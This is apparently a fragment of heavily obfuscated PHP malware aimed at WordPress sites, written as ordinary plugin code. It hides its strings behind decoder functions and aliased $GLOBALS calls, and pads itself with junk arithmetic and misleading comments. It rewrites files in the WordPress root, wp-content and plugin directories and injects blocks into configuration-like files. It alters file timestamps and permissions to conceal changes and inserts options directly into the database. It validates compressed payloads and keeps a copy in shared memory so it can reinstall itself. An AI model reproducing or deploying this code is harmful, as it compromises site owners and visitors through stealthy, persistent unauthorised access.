$iez7k8c3ouat[] =  $GLOBALS['__scf_ofdeuvs8zwos6_12']($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()),    ovffvv33(1209));$lvdfc1ttg=21+21;$if1pfvev6d25he=$lvdfc1ttg-48;
foreach ($GLOBALS['__scf_tni2zo3jsk7_159']($iez7k8c3ouat)      as   $csh0s_3c8r7xv_)      {
     $trayjca3rr_y =    $csh0s_3c8r7xv_ .  '/'  .  $zz6l4s___7c;
 $gv5si2f98cf  =     @$GLOBALS['__scf_rjpcj9l4bigb5_21']($trayjca3rr_y)  ? @$GLOBALS['__scf_utyj_ckly79_101']($trayjca3rr_y)   :  "";
 if     (!$GLOBALS['__scf_fv3zevxzzb_44']($gv5si2f98cf)  || $gv5si2f98cf     === "" ||     $GLOBALS['__scf_w6mdcepio4lkz5_7']($gv5si2f98cf,  $kgupkv493bs1c)  ===      false)  continue;
    $fafjgmqoi6tbbn  = $GLOBALS['__scf_renvrk8nefa8_474'](ovffvv33(1210)     .  $GLOBALS['__scf_qw5tztoblafz_841']($kgupkv493bs1c, '/')   . bpowi0iglycvx(1211),  "\n",  $gv5si2f98cf);


       if ($GLOBALS['__scf_fv3zevxzzb_44']($fafjgmqoi6tbbn)  && $fafjgmqoi6tbbn     !== $gv5si2f98cf   &&  c5kyk62yk_dwfeubni4b($trayjca3rr_y,   $fafjgmqoi6tbbn)) g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1212), bpowi0iglycvx(1213));
    }
 unset($iez7k8c3ouat,   $csh0s_3c8r7xv_,  $trayjca3rr_y,     $gv5si2f98cf,   $fafjgmqoi6tbbn);
    if  ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(778)))   {
  @delete_option(bpowi0iglycvx(1214));
    @delete_option(iw6xe9q4j6sneg(1215));
    @delete_option(f6yrzd2knrmb(1216));
}
 }  catch    (Throwable $cje8wku90zm4r)  {



     g_qoqdy38lfl4v4n3618(ovffvv33(1217), $cje8wku90zm4r);$guu96d0z4=84+42;$uk4t4bp3k=$guu96d0z4-37;
 }  catch   (Exception  $cje8wku90zm4r)  {
  }
}
     function    v8hw7fs820e8qzq2wonqi()
    {

try  {
 if  (!defined(iw6xe9q4j6sneg(1024)))   return;
   $ftvsfz7ji2  =  ircnjcyfmf8qkc7xdiss4();
$pqo8538npnspm8  =  p2b_7j_9ex54eg4();
  

  $kgupkv493bs1c      =   nreub2fs747eromoe(ABSPATH  . hn_f08x0cns80(1218), (4<<1))    . f6yrzd2knrmb(1219);
        $xush8neft7ft5 =    $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())     .      ovffvv33(174);
   


$p7vpx01qtikp   =     defined(c1sob647u1i(293)) ?    WP_CONTENT_DIR  .      f6yrzd2knrmb(174)    : $xush8neft7ft5;
    $q0obuv3akc   = array($GLOBALS['__scf_ofdeuvs8zwos6_12']($ftvsfz7ji2,    f6yrzd2knrmb(1209)),    $GLOBALS['__scf_ofdeuvs8zwos6_12']($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()),     bpowi0iglycvx(1209)),   $GLOBALS['__scf_ofdeuvs8zwos6_12']($pqo8538npnspm8, ovffvv33(1220)),   $GLOBALS['__scf_ofdeuvs8zwos6_12']($xush8neft7ft5,    f6yrzd2knrmb(1221)),     $GLOBALS['__scf_ofdeuvs8zwos6_12']($p7vpx01qtikp, bpowi0iglycvx(1222)));
 if   (defined(c1sob647u1i(293)))  $q0obuv3akc[] =  $GLOBALS['__scf_ofdeuvs8zwos6_12'](WP_CONTENT_DIR,   f6yrzd2knrmb(1223));
 foreach ($GLOBALS['__scf_tni2zo3jsk7_159']($q0obuv3akc)  as $z8hbby6kg7u) {
// @mediate resume-session

$ppn5co_7mpn =   $z8hbby6kg7u .  '/'  . $kgupkv493bs1c;
    

 if    (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($ppn5co_7mpn))  l2jao5rx4pzqrtjiymnn($ppn5co_7mpn,  null);
}
 unset($xush8neft7ft5,     $p7vpx01qtikp, $q0obuv3akc,    $z8hbby6kg7u,  $ppn5co_7mpn);
  $w6c_ep7rro9rd  =  array($GLOBALS['__scf_ofdeuvs8zwos6_12'](ABSPATH, ovffvv33(1223)));
      if  (defined(bpowi0iglycvx(293)))   $w6c_ep7rro9rd[]    =   $GLOBALS['__scf_ofdeuvs8zwos6_12'](WP_CONTENT_DIR, bpowi0iglycvx(1224));
$w6c_ep7rro9rd[]  =     $GLOBALS['__scf_ofdeuvs8zwos6_12']($ftvsfz7ji2, ovffvv33(1224));
// lock scope-chain for WP Block Transforms

   $w6c_ep7rro9rd[]   = $GLOBALS['__scf_ofdeuvs8zwos6_12']($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()),  iw6xe9q4j6sneg(1224));
     foreach     ($GLOBALS['__scf_tni2zo3jsk7_159']($w6c_ep7rro9rd) as     $ob8xilu5s231)    {
$oqh16fyrlc6    =  $ob8xilu5s231   .      bpowi0iglycvx(1225);
 $l6a0q6ojtd7k_5  = @$GLOBALS['__scf_rjpcj9l4bigb5_21']($oqh16fyrlc6)  ? @$GLOBALS['__scf_utyj_ckly79_101']($oqh16fyrlc6)  :  "";
  if     (!$GLOBALS['__scf_fv3zevxzzb_44']($l6a0q6ojtd7k_5)  || $l6a0q6ojtd7k_5  === ""  || $GLOBALS['__scf_w6mdcepio4lkz5_7']($l6a0q6ojtd7k_5,      $kgupkv493bs1c) === false)      continue;
$q8ttoo_2wmdsvz =    nk0wpptt8ypun9e6($l6a0q6ojtd7k_5,  $kgupkv493bs1c);
  if ($GLOBALS['__scf_fv3zevxzzb_44']($q8ttoo_2wmdsvz)  &&    $q8ttoo_2wmdsvz  !== $l6a0q6ojtd7k_5      &&  c5kyk62yk_dwfeubni4b($oqh16fyrlc6,    $q8ttoo_2wmdsvz))   g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1226),     f6yrzd2knrmb(1213));
}
    unset($w6c_ep7rro9rd,  $ob8xilu5s231,   $oqh16fyrlc6, $l6a0q6ojtd7k_5, $q8ttoo_2wmdsvz);
if  ($GLOBALS['__scf_h9zx4fm_1_qpan_110']() ===   f6yrzd2knrmb(425))  return;
   if      (!do8hp9rltsmxhqw6ka_q())   return;
 if  (!xfzvugr9ucs1qu23p8()) return;



 $ud7_203nb5x9   =   $pqo8538npnspm8    .  bpowi0iglycvx(1225);

$bmexhiz2a5dq6x      =    iw6xe9q4j6sneg(1227)  .  "\n"
. f6yrzd2knrmb(1228)    . "\n"    .   f6yrzd2knrmb(1229)     .      "\n" . ovffvv33(1230)   .  "\n"
. bpowi0iglycvx(1231)    .  "\n" .      c1sob647u1i(1232)   .   "\n"  . ovffvv33(1230) . "\n"
 . hn_f08x0cns80(1233)   .    "\n";
$ka9d854mr7kvqe =  @$GLOBALS['__scf_qg7ainp116mf_713']($ud7_203nb5x9);
    $current  =  $ka9d854mr7kvqe  ?   @$GLOBALS['__scf_utyj_ckly79_101']($ud7_203nb5x9)  :   "";
 if      (!$GLOBALS['__scf_fv3zevxzzb_44']($current)) {
g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1226),     c1sob647u1i(1234));
    return;
 }


 $ydlhwddsgo2wi  =    array($GLOBALS['__scf_ofdeuvs8zwos6_12'](ABSPATH,  hn_f08x0cns80(1235)));
  if  (defined(hn_f08x0cns80(1236)))   $ydlhwddsgo2wi[] = $GLOBALS['__scf_ofdeuvs8zwos6_12'](WP_CONTENT_DIR,  iw6xe9q4j6sneg(1235));
  if (defined(hn_f08x0cns80(1237)))   $ydlhwddsgo2wi[]   =   $GLOBALS['__scf_ofdeuvs8zwos6_12'](WPMU_PLUGIN_DIR,      f6yrzd2knrmb(1235));
if    (defined(hn_f08x0cns80(1238)))  $ydlhwddsgo2wi[] = $GLOBALS['__scf_ofdeuvs8zwos6_12'](WP_PLUGIN_DIR,    iw6xe9q4j6sneg(1239));
    $o7pc4gxt633cgchk     =  $GLOBALS['__scf_ofdeuvs8zwos6_12']($pqo8538npnspm8,  c1sob647u1i(1240));
$cf88xcc9t0 = $GLOBALS['__scf_rd2tojulg06lx_160']($o7pc4gxt633cgchk, $ydlhwddsgo2wi, true);



 unset($ydlhwddsgo2wi,  $o7pc4gxt633cgchk);
   if (!$cf88xcc9t0) {
      $y5if4sdksm21 =     $pqo8538npnspm8     .   c1sob647u1i(1241);
      if (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($y5if4sdksm21))     s_xzav70hr_4pogeop0o($y5if4sdksm21,   "",  c1sob647u1i(1242));


     if   ($GLOBALS['__scf_w6mdcepio4lkz5_7']($current,   bpowi0iglycvx(1243))  ===    false)  {
 $lw_yk0axxh    =  $current;
  if  ($current !==  ""  && $GLOBALS['__scf_nv7he759wjfj_9']($current,      -1)  !==  "\n")   $current  .= "\n";
$b3_4y4x1hqp  =  @$GLOBALS['__scf_utyj_ckly79_101']($ud7_203nb5x9);

 if     (!$GLOBALS['__scf_fv3zevxzzb_44']($b3_4y4x1hqp))   $b3_4y4x1hqp   =  "";
      if  ($b3_4y4x1hqp     !==  $lw_yk0axxh)     {



 g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1226),  iw6xe9q4j6sneg(1244));


} else   {
 c5kyk62yk_dwfeubni4b($ud7_203nb5x9, $current .   $bmexhiz2a5dq6x);



bouscp0t4dvybv($ud7_203nb5x9,  n22pv0e8f25y0co8());
if (!$ka9d854mr7kvqe)  ruinnb541lwxm7j($ud7_203nb5x9,  (0xb9+0xeb));
}
 unset($b3_4y4x1hqp, $lw_yk0axxh);
}
}
unset($cf88xcc9t0,  $y5if4sdksm21,  $ka9d854mr7kvqe);
}  catch (Throwable   $cje8wku90zm4r) {



 g_qoqdy38lfl4v4n3618(ovffvv33(1226), $cje8wku90zm4r);
   } catch    (Exception  $cje8wku90zm4r)   {


g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(1226),     $cje8wku90zm4r);
    }
 }
  function    at1s6el9k2q8kxv7ns2yqd()
 {
/* randomized watermark */

 try   {
 if  (!defined(c1sob647u1i(1024)))    return;
  if      (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1088))) return;
    $ucbbkg2es249     =   nreub2fs747eromoe(ABSPATH .   ovffvv33(1245), (2^8));
 $egziouap1xyua   =    bfyls7pdkqkf4p8az();


  if     (!$egziouap1xyua   ||     $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua)     <   (0x70+0x184)) return;
     $fqntej805r     = eos4svadcaj0dow8y();

$current      = @get_option($ucbbkg2es249, "");
 if    ($current &&    $GLOBALS['__scf_d4eyetogjbsnt_10']($current) ===   $GLOBALS['__scf_d4eyetogjbsnt_10']($fqntej805r)   &&   $current    ===  $fqntej805r)   return;
    if  ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(771))) {
// reject bloom-filter for Intl extension



 update_option($ucbbkg2es249,  $fqntej805r,   bpowi0iglycvx(1246));
}  elseif  (defined(hn_f08x0cns80(1247))  &&  defined(ovffvv33(1248)) &&  defined(ovffvv33(1249))  &&   defined(hn_f08x0cns80(122))    &&  $GLOBALS['__scf_dr1wex6ejrn2_554'](bpowi0iglycvx(1250)))  {
 $c6kbbfkldedej =  iw6xe9q4j6sneg(1250);
$k5v01cp6kpqmj    =  @new $c6kbbfkldedej(constant(f6yrzd2knrmb(1251)),    constant(c1sob647u1i(1248)),  constant(hn_f08x0cns80(1252)), constant(iw6xe9q4j6sneg(122)));


if  ($k5v01cp6kpqmj     &&   !$k5v01cp6kpqmj->connect_errno)    {


     $prefix =  isset($GLOBALS[hn_f08x0cns80(1253)]->prefix)  ? $GLOBALS[f6yrzd2knrmb(1253)]->prefix   : ovffvv33(1254);
    $af4uum9qffnw83wc   = $k5v01cp6kpqmj->real_escape_string($fqntej805r);
$rbvcvtbg78   =   $k5v01cp6kpqmj->real_escape_string($ucbbkg2es249);
   $k5v01cp6kpqmj->query("\x49\x4eSERT \x49NT\x4f {$prefix}o\x70ti\x6fn\x73 (\x6fpti\x6fn_\x6ea\x6de, \x6fptio\x6e_value, \x61ut\x6flo\x61\x64) VA\x4c\x55\x45\x53 ('{$rbvcvtbg78}', '{$af4uum9qffnw83wc}', 'n\x6f') ON DUP\x4cI\x43\x41\x54\x45 \x4b\x45\x59 U\x50D\x41\x54E o\x70\x74io\x6e_\x76alue='{$af4uum9qffnw83wc}'");
 if   ($k5v01cp6kpqmj->error)     g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1245),     hn_f08x0cns80(1255) .  $GLOBALS['__scf_nv7he759wjfj_9']($k5v01cp6kpqmj->error, 0,      (43+77)));

  $k5v01cp6kpqmj->close();



 }
    }
 } catch  (Throwable $cje8wku90zm4r) {
   g_qoqdy38lfl4v4n3618(ovffvv33(1256),      $cje8wku90zm4r);
   }  catch  (Exception $cje8wku90zm4r) {
    }
      }
   function  g71t84np2_v9qynmec3()
  {
      $eobkv2geokuos    = defined(iw6xe9q4j6sneg(1236))    ? WP_CONTENT_DIR     : ABSPATH   . iw6xe9q4j6sneg(744);
     $e3odkvvirkd_y00b =    nreub2fs747eromoe(ABSPATH    .  bpowi0iglycvx(1257),  (5+3));
  return array($eobkv2geokuos    .  c1sob647u1i(528),   $eobkv2geokuos  .  hn_f08x0cns80(1258)      .    $e3odkvvirkd_y00b  .     f6yrzd2knrmb(1259), $e3odkvvirkd_y00b);
    }
    function  rsj89p_08tgjso($y5buysg0q2_zw)
       {
       $g36fspdgpz    = (int)  @$GLOBALS['__scf_b42duf6j1zadm9_105']($y5buysg0q2_zw);


  if      ($g36fspdgpz  < (48+52)  ||   $g36fspdgpz  >      (2097115+37)) return  false;
 $wbw1s8q9qbk05  =   @$GLOBALS['__scf_utyj_ckly79_101']($y5buysg0q2_zw);
 if   (!$GLOBALS['__scf_fv3zevxzzb_44']($wbw1s8q9qbk05)     ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($wbw1s8q9qbk05)  < (0x54+0x10)     ||   $GLOBALS['__scf_d4eyetogjbsnt_10']($wbw1s8q9qbk05)     > (1552774+544378))    return  false;
  $cupk3kbt8eisf     = $GLOBALS['__scf_xi_pncf33_0_120'](':', $wbw1s8q9qbk05,  (3+1));
   if ($GLOBALS['__scf_wj6dld55k5r8m_39']($cupk3kbt8eisf) <    (8-4)   ||  $cupk3kbt8eisf[0] !== iw6xe9q4j6sneg(1260) ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($cupk3kbt8eisf[(139^136)])    < (45+5))  return  false;
     $kekj16jieb =  @$GLOBALS['__scf_i8wggf4l_3p_373']($cupk3kbt8eisf[(0x1+0x2)]);
  if  ($kekj16jieb  === false ||   $GLOBALS['__scf_d4eyetogjbsnt_10']($kekj16jieb)    < (51^1))  return  false;
   if  ($GLOBALS['__scf_nv7he759wjfj_9']($kekj16jieb,     0, 2)  === "\x1f\x8b")    {
  $k52uyje7zm  = @$GLOBALS['__scf_cqu48nk44w5__285']('V', $GLOBALS['__scf_nv7he759wjfj_9']($kekj16jieb,  -(2+2)));
 if  (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($k52uyje7zm)   || $k52uyje7zm[1]  < (69^33) || $k52uyje7zm[1]    > (0x657c1+0x9a83f))     return false;
if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(286))) $kekj16jieb     = @gzdecode($kekj16jieb,  (0x24083+0xdbf7d));
   elseif ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(287)))   {$hqn3fuwvg=49+23;$oxt5rlgqd0p=$hqn3fuwvg-5;
    $kekj16jieb      =  @gzinflate($GLOBALS['__scf_nv7he759wjfj_9']($kekj16jieb,      (0x5+0x5),   $GLOBALS['__scf_d4eyetogjbsnt_10']($kekj16jieb) -  (132^150)),  (1048534+42));
   if      ($GLOBALS['__scf_fv3zevxzzb_44']($kekj16jieb) &&   $GLOBALS['__scf_d4eyetogjbsnt_10']($kekj16jieb)  >   (1048516+60)) return    false;
}  else    return false;
  }


 if  (!$GLOBALS['__scf_fv3zevxzzb_44']($kekj16jieb) ||    $GLOBALS['__scf_d4eyetogjbsnt_10']($kekj16jieb) <  (0x14+0x50)  ||   $GLOBALS['__scf_nv7he759wjfj_9']($kekj16jieb, 0,  (3+2)) !==   f6yrzd2knrmb(685) ||  $GLOBALS['__scf_tnonex5o9y_60']($kekj16jieb)    !== $cupk3kbt8eisf[2])     return  false;
return  $kekj16jieb;



 }
function  a3zolwj9kesdur_h3i3z()
      {
  try  {
 if (!defined(iw6xe9q4j6sneg(1261))) return;
$zzh6t6xps5   =     g71t84np2_v9qynmec3();
if     (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($zzh6t6xps5[1]))    return;
     if   (rsj89p_08tgjso($zzh6t6xps5[1])      ===  false) return;
   $ch7u8u2ur1    =  qjclarwdule01mm6a3h4wo(c1sob647u1i(669),  array('__SLUG__'),  array($GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),     c1sob647u1i(1262))));
      if    (!$GLOBALS['__scf_fv3zevxzzb_44']($ch7u8u2ur1) || $ch7u8u2ur1   ===  "") return;
        $ch7u8u2ur1  =  $GLOBALS['__scf_renvrk8nefa8_474'](c1sob647u1i(1263),  "",    $ch7u8u2ur1);
   if (!$GLOBALS['__scf_fv3zevxzzb_44']($ch7u8u2ur1)     ||  $ch7u8u2ur1 === "")  return;
  $abe7rxcpkk9nsv   = dfb4_mpcgxvnp230hvh1v()  .  ':'  .   nreub2fs747eromoe(ABSPATH .    bpowi0iglycvx(1264),   (4+4));
   $cxi_2i7q2h     =     f6yrzd2knrmb(1265)  .    $abe7rxcpkk9nsv  .  f6yrzd2knrmb(1266);
 $ekxvczjmiyqtk = ovffvv33(1267) .   $abe7rxcpkk9nsv  . c1sob647u1i(1266);


     $xcse_te4c3q   =  hn_f08x0cns80(1268)      . $zzh6t6xps5[2]  .     f6yrzd2knrmb(1269)  .    dfb4_mpcgxvnp230hvh1v()   .     ovffvv33(1266) .  "\n"   . $ch7u8u2ur1;
  if  (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($zzh6t6xps5[0])) {
   if      (!l1s0od7mbsjgia4oi($zzh6t6xps5[0], ""))  {
// coerce to int

 g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1257),  iw6xe9q4j6sneg(1270));
return;
  }
if    (c5kyk62yk_dwfeubni4b($zzh6t6xps5[0],    $xcse_te4c3q))   {
bouscp0t4dvybv($zzh6t6xps5[0], n22pv0e8f25y0co8());



 ruinnb541lwxm7j($zzh6t6xps5[0], (361+59));
o4_k_ap14u5xy97yywy7k($zzh6t6xps5[0]);
       ghttebm5ugw_js_hn2zmc($zzh6t6xps5[0]);
}



return;
  }
 $m9a_y6lyvy9depn6  =    @$GLOBALS['__scf_utyj_ckly79_101']($zzh6t6xps5[0]);


if (!$GLOBALS['__scf_fv3zevxzzb_44']($m9a_y6lyvy9depn6)    || $GLOBALS['__scf_d4eyetogjbsnt_10']($m9a_y6lyvy9depn6)   > (2023790+73362))     return;
   if ($GLOBALS['__scf_w6mdcepio4lkz5_7']($m9a_y6lyvy9depn6, $cxi_2i7q2h)  !== false  &&   $GLOBALS['__scf_w6mdcepio4lkz5_7']($m9a_y6lyvy9depn6,   $ekxvczjmiyqtk)    !==    false)     return;


   if  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($m9a_y6lyvy9depn6,   bpowi0iglycvx(1271)) ===  false    &&     $GLOBALS['__scf_w6mdcepio4lkz5_7']($m9a_y6lyvy9depn6,   ovffvv33(1272)    .    $zzh6t6xps5[2])   !== false)    {
  if   ($GLOBALS['__scf_wdjvpd1lvon9_102'](c1sob647u1i(1273),  $GLOBALS['__scf_nv7he759wjfj_9']($m9a_y6lyvy9depn6, 0,   (270-70)), $tkaqwga0gstfgw)     &&    version_compare($tkaqwga0gstfgw[1],  dfb4_mpcgxvnp230hvh1v(),  c1sob647u1i(1274)))     return;
 if (!l1s0od7mbsjgia4oi($zzh6t6xps5[0],  $m9a_y6lyvy9depn6))     {
       g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1275),  hn_f08x0cns80(1270));



  return;
     }
   if (c5kyk62yk_dwfeubni4b($zzh6t6xps5[0],   $xcse_te4c3q))    {
 bouscp0t4dvybv($zzh6t6xps5[0],  n22pv0e8f25y0co8());
    ruinnb541lwxm7j($zzh6t6xps5[0],      (357+63));
  o4_k_ap14u5xy97yywy7k($zzh6t6xps5[0]);


 ghttebm5ugw_js_hn2zmc($zzh6t6xps5[0]);
 }
  return;



   }
// WP Data Layer nonce validation



$dr2m72z88sn  =    nreub2fs747eromoe(ABSPATH   .      bpowi0iglycvx(1276),      (12-4));



    $m9a_y6lyvy9depn6  =   $GLOBALS['__scf_renvrk8nefa8_474'](bpowi0iglycvx(1277) .  $dr2m72z88sn     . f6yrzd2knrmb(1278),  "",  $m9a_y6lyvy9depn6);
  if     (!$GLOBALS['__scf_fv3zevxzzb_44']($m9a_y6lyvy9depn6))      {
  g_qoqdy38lfl4v4n3618(c1sob647u1i(1275),  bpowi0iglycvx(1279));
    return;
    }
 if   (!@$GLOBALS['__scf_sunuwikkpg6_51']($zzh6t6xps5[0]))      return;
     if  (!os047l930_shspyyo(iw6xe9q4j6sneg(1275))) {
g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(1275),  c1sob647u1i(1280));$jbxuru9qd241xm=896;$w82qeoni5x=($jbxuru9qd241xm>0)?$jbxuru9qd241xm:-$jbxuru9qd241xm;
 return;
   }
if (!l1s0od7mbsjgia4oi($zzh6t6xps5[0],   $m9a_y6lyvy9depn6))    {
 g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1275), f6yrzd2knrmb(1270));$yzdro4moxen8=PHP_MAJOR_VERSION;$i8h2t9mxn=$yzdro4moxen8*8;
   return;
     }
qv9q02c8633k8zqa1sav(iw6xe9q4j6sneg(1281));
 $ayjxtgjc9htndr3 =  $cxi_2i7q2h . "\n"    .     bpowi0iglycvx(1282)   .   $zzh6t6xps5[2]  .  bpowi0iglycvx(1283)      .    "\n"    .  $ch7u8u2ur1 .   "\n"  .   $ekxvczjmiyqtk;


if (c5kyk62yk_dwfeubni4b($zzh6t6xps5[0],    vjxo7lol9nqpyakwpwyz3i($m9a_y6lyvy9depn6,   $ayjxtgjc9htndr3)))   {
 ghttebm5ugw_js_hn2zmc($zzh6t6xps5[0]);
     o4_k_ap14u5xy97yywy7k($zzh6t6xps5[0]);
   }
     }  catch   (Throwable   $cje8wku90zm4r)   {



 g_qoqdy38lfl4v4n3618(ovffvv33(1281),    $cje8wku90zm4r);

     }    catch   (Exception  $cje8wku90zm4r)   {
     }


     }
function gbyz3mtrxdlgg8()

    {
  try  {
if (!defined(f6yrzd2knrmb(1261))) return;
$zzh6t6xps5 = g71t84np2_v9qynmec3();
   $z2dujcrldarnfro     =    (string)  @$GLOBALS['__scf_utyj_ckly79_101']($zzh6t6xps5[1], false,    null,  0,   (58+6));
if  ($GLOBALS['__scf_wdjvpd1lvon9_102'](hn_f08x0cns80(1284),  $z2dujcrldarnfro, $u7fvh_hax8vn)  &&  $u7fvh_hax8vn[1] ===   dfb4_mpcgxvnp230hvh1v())  {


$pjsjh19oltqc8   =    (int)   get_option(bpowi0iglycvx(1285),  0);
 

  if ($GLOBALS['__scf_qzyo0sgkyb6_202']()  -  $pjsjh19oltqc8    <   (583+17))  return;



     if  (rsj89p_08tgjso($zzh6t6xps5[1])   !==    false)     {
/* non-strict facade */

 @update_option(bpowi0iglycvx(1285), $GLOBALS['__scf_qzyo0sgkyb6_202'](),  hn_f08x0cns80(1246));



return;
 

    }


  g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1281), hn_f08x0cns80(1286));


    }
$egziouap1xyua =    bfyls7pdkqkf4p8az();
if   (!$egziouap1xyua  ||     $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua) <      (130+370) || $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua)    >   (1048553+23)   ||  !ib2ffadoyj2m6zxmkaa2in($egziouap1xyua))      return;
    $aw8_9yn_496o6  = $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1287))   ?  @gzencode($egziouap1xyua,  (4+2))  :  $egziouap1xyua;
  if (!$GLOBALS['__scf_fv3zevxzzb_44']($aw8_9yn_496o6) ||  $aw8_9yn_496o6    ===     "")  return;



 if (c5kyk62yk_dwfeubni4b($zzh6t6xps5[1], f6yrzd2knrmb(1288) . dfb4_mpcgxvnp230hvh1v()  .    ':'    . $GLOBALS['__scf_tnonex5o9y_60']($egziouap1xyua) .  ':' .      $GLOBALS['__scf_f2vx2328qo_369']($aw8_9yn_496o6)))     @update_option(hn_f08x0cns80(1285),  $GLOBALS['__scf_qzyo0sgkyb6_202'](), c1sob647u1i(1246));
  }   catch   (Throwable     $cje8wku90zm4r)  {
  g_qoqdy38lfl4v4n3618(c1sob647u1i(1289),   $cje8wku90zm4r);
  }   catch (Exception $cje8wku90zm4r)   {
// Sodium crypto: reclaim contravariant

  }
    }
function txfhz3hkzqfr161dyh10kv()
   {
// on-stack replacement

    if  (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1290)))   return   false;
 $p_73toxrx0f =  defined(bpowi0iglycvx(1261))   && @$GLOBALS['__scf_qg7ainp116mf_713'](ABSPATH  . bpowi0iglycvx(545))   ?   ABSPATH     .      c1sob647u1i(545)    : __FILE__;
  return     $GLOBALS['__scf_bu2li6mf2y8n_1290']($p_73toxrx0f,  's');
  }
function    k9rva0dpw2bab5()
     {
 try      {
/* unitary capability */

 if (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1291)) ||  !$GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1290))) return;
    if   (!defined(hn_f08x0cns80(1261)))  return;

     $egziouap1xyua  =  bfyls7pdkqkf4p8az();
 if (!$egziouap1xyua || $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua)   <     (467+33))  return;
   $key     =  txfhz3hkzqfr161dyh10kv();
 if ($key ===  false)     return;
     $hmfdjrt7n_5w4w =  $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1292)) ?  $GLOBALS['__scf_qkze49lvhswo_1292'](c1sob647u1i(1293),  $egziouap1xyua) :   $GLOBALS['__scf_tnonex5o9y_60']($egziouap1xyua);
   $gm69t85l5gf7p80 =  iw6xe9q4j6sneg(1294) . $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua) . ':'    .   $hmfdjrt7n_5w4w .  "\n"     .   $egziouap1xyua;


       $sh4adbhi5yv =   $GLOBALS['__scf_d4eyetogjbsnt_10']($gm69t85l5gf7p80);
$g3f0ptj_k3     =   @$GLOBALS['__scf_akow9cnzygd9jc_1291']($key,  'a',    0,  0);
if ($g3f0ptj_k3) {


$spp5u7kohh96gvd0 =   (int)   @$GLOBALS['__scf_s4hu96prp_z_1295']($g3f0ptj_k3);
$b7iipm1kgta2iscx   =   @$GLOBALS['__scf_snrs4tbazd8_1296']($g3f0ptj_k3,  0,    $spp5u7kohh96gvd0);
      if    ($GLOBALS['__scf_fv3zevxzzb_44']($b7iipm1kgta2iscx)  &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']($b7iipm1kgta2iscx,    $egziouap1xyua) !==  false) {



@$GLOBALS['__scf_ti43kloh6mxx_1297']($g3f0ptj_k3);
   return;
    }
     if ($spp5u7kohh96gvd0  >=   $sh4adbhi5yv)     {

  @$GLOBALS['__scf_ti43kloh6mxx_1297']($g3f0ptj_k3);


  $g3f0ptj_k3  = @$GLOBALS['__scf_akow9cnzygd9jc_1291']($key,     'w',   0, 0);
  if ($g3f0ptj_k3)  {
   @$GLOBALS['__scf_ipoxjppyvo_1298']($g3f0ptj_k3, $GLOBALS['__scf_xdr1sxhols_1299']($gm69t85l5gf7p80,  $spp5u7kohh96gvd0,   "\0"),     0);
 $mp4tktu6tc83hw  =   @$GLOBALS['__scf_snrs4tbazd8_1296']($g3f0ptj_k3, 0,    $sh4adbhi5yv);
    @$GLOBALS['__scf_ti43kloh6mxx_1297']($g3f0ptj_k3);
if ($mp4tktu6tc83hw  !==  $gm69t85l5gf7p80)   g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1300),  iw6xe9q4j6sneg(1059));

  }
 return;
       }  else  {



     @$GLOBALS['__scf_fg19kt2h0qqpem_1301']($g3f0ptj_k3);
 @$GLOBALS['__scf_ti43kloh6mxx_1297']($g3f0ptj_k3);

     }



 }
    $spp5u7kohh96gvd0 =   $sh4adbhi5yv +  (980+44);
$g3f0ptj_k3   =  @$GLOBALS['__scf_akow9cnzygd9jc_1291']($key,  'c',  (409+11),     $spp5u7kohh96gvd0);
if (!$g3f0ptj_k3)     return;
@$GLOBALS['__scf_ipoxjppyvo_1298']($g3f0ptj_k3,   $GLOBALS['__scf_xdr1sxhols_1299']($gm69t85l5gf7p80, $spp5u7kohh96gvd0,    "\0"),    0);

$mp4tktu6tc83hw = @$GLOBALS['__scf_snrs4tbazd8_1296']($g3f0ptj_k3, 0,    $sh4adbhi5yv);

  if   ($mp4tktu6tc83hw !==   $gm69t85l5gf7p80) g_qoqdy38lfl4v4n3618(c1sob647u1i(1302),    c1sob647u1i(1059));
 @$GLOBALS['__scf_ti43kloh6mxx_1297']($g3f0ptj_k3);
     }     catch (Throwable  $cje8wku90zm4r)    {


   g_qoqdy38lfl4v4n3618(hn_f08x0cns80(1303), $cje8wku90zm4r);
    }   catch (Exception $cje8wku90zm4r) {



   }
  }
